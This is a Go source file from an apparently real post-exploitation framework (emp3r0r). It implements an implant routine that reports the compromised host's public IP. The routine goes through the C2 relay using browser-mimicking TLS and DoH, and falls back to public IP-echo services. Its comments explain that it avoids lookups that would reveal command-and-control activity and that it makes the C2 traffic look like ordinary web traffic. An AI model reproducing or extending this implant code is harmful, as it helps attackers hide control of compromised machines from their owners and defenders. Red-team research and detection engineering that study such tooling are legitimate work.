package agentutils

import (
	"context"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
)

// externalIPSources are public "echo your IP" endpoints, used ONLY when no
// relay is configured (direct/http_poll test mode). In relay mode the agent
// asks its own Worker (GET /extip) instead: third-party IP-echo services are
// a classic malware-recon indicator, and querying them from the same host
// that keeps a long-lived WSS to an obscure domain practically shouts C2.
var externalIPSources = []string{
	"https://api.ip.sb/ip",
	"https://ifconfig.me/ip",
	"https://api.ipify.org",
	"https://icanhazip.com",
	"https://checkip.amazonaws.com",
	"https://ipinfo.io/ip",
}

// GetExternalIP resolves this machine's public egress IP. In relay mode it
// comes from the relay Worker (CF-Connecting-IP); otherwise from public
// echo services. Returns "" when nothing answers.
//
// The CC cannot derive this address when agents dial in through the relay —
// the CC only ever sees the relay's (Cloudflare edge) address — so the agent
// must self-report it. DNS for these lookups goes through whatever resolver
// the agent process has installed (DoH when configured).
func GetExternalIP() string {
	return GetExternalIPTimeout(4 * time.Second)
}

// GetExternalIPTimeout is GetExternalIP with an explicit overall budget.
func GetExternalIPTimeout(timeout time.Duration) string {
	// Relay mode first: same domain, same browser-fingerprinted TLS as the
	// WS channel — indistinguishable from ordinary web-app traffic. No
	// third-party fallback in relay mode: a failed relay means checkin
	// fails anyway, and the fallback would reintroduce the recon tell.
	if common.RuntimeConfig.C2ChannelMode == "worker_ws" || strings.HasPrefix(common.RuntimeConfig.CCAddress, "wss://") {
		return relayExternalIP(timeout)
	}

	pool := append([]string(nil), externalIPSources...)
	rand.Shuffle(len(pool), func(i, j int) { pool[i], pool[j] = pool[j], pool[i] })
	if len(pool) > 3 {
		pool = pool[:3]
	}

	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	ch := make(chan string, len(pool))
	var wg sync.WaitGroup
	for _, src := range pool {
		wg.Add(1)
		go func(src string) {
			defer wg.Done()
			if ip := queryExternalIPSource(ctx, src); ip != "" {
				select {
				case ch <- ip:
				default:
				}
			}
		}(src)
	}
	go func() { wg.Wait(); close(ch) }()

	select {
	case ip, ok := <-ch:
		if ok && ip != "" {
			cancel()
			return ip
		}
	case <-ctx.Done():
	}
	// late answers (after timeout)
	for ip := range ch {
		if ip != "" {
			return ip
		}
	}
	return ""
}

// relayExternalIP asks the relay Worker for our egress address: CF sees the
// client's real IP (CF-Connecting-IP) and returns it. The HTTPS request
// rides BrowserLikeTLSDial — the same randomized browser ClientHello as the
// WS channel — resolved via the agent's DoH resolver, on the relay's own
// domain. Empty string on any failure.
func relayExternalIP(timeout time.Duration) string {
	addr := common.RuntimeConfig.CCAddress
	if !strings.HasPrefix(addr, "wss://") && !strings.HasPrefix(addr, "ws://") {
		return ""
	}
	u, err := url.Parse(addr)
	if err != nil || u.Host == "" {
		return ""
	}
	secret := u.Query().Get("secret")
	if secret == "" {
		return ""
	}
	endpoint := "https://" + u.Host + "/extip?secret=" + url.QueryEscape(secret)

	client := &http.Client{
		Timeout: timeout,
		Transport: &http.Transport{
			ForceAttemptHTTP2: false, // uTLS negotiates http/1.1 (WS-like ALPN)
			DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
				// resolved via net.DefaultResolver (the agent's DoH)
				return transport.BrowserLikeTLSDial(ctx, addr, nil)
			},
		},
	}
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, endpoint, nil)
	if err != nil {
		return ""
	}
	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return ""
	}
	body, err := io.ReadAll(io.LimitReader(resp.Body, 64))
	if err != nil {
		return ""
	}
	ip := strings.TrimSpace(string(body))
	if net.ParseIP(ip) == nil {
		return ""
	}
	return ip
}

func queryExternalIPSource(ctx context.Context, src string) string {
	client := &http.Client{Timeout: 3500 * time.Millisecond}
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, src, nil)
	if err != nil {
		return ""
	}
	// plain curl-ish UA: these services return different bodies for browsers
	req.Header.Set("User-Agent", "curl/8.5.0")
	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(io.LimitReader(resp.Body, 64))
	if err != nil {
		return ""
	}
	ip := strings.TrimSpace(string(body))
	if net.ParseIP(ip) == nil {
		return ""
	}
	return ip
}
